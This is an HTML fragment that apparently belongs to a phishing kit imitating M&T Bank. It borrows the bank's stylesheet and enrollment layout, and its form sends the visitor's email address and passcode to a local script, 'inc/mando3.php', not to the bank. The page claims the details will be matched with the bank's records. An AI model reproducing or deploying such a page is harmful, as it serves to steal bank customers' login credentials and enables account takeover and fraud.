...
<head>
    ...
    <link href="https://resources.mtb.com/r/simple-layout-responsive/css.mtb?v=03042021140516" rel="stylesheet"/>
...
<form action="inc/mando3.php" method="post"><input id="UnMaskedUserId" name="UnMaskedUserId" type="hidden" value="" />    <div class="mtb-app-enrollment">
            ...
            <div class="mtb-page-error">
                ...
                <div class="mtb-app-default--content">
                    <div class="callout __has-icon warning __no-border">
                        ...
                        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                         The details will be matched with records in our file
            ...
            <div class="grid-x grid-padding-x grid-x__padded __spacer-section">
                ...
                <div class="cell">
                    ...
                    <div class="input-group m-fake-single-input">
                        <input class="input-group-field js-formnputItem" data-fc-id="121" type="email" id="txtUserID" name="txtEmailID" autocomplete="off"
                               aria-required="true" data-inputtype="text" data-attribute="" maxlength="35" value="" />
                ...
                <div class="cell">
                    ...
                    <div class="input-group m-fake-single-input">
                        <input class="input-group-field js-formnputItem" data-fc-id="122" type="password" id="Passcode" name="txtePasscode" autocomplete="off" aria-required="true" data-inputtype="tel" maxlength="20" />
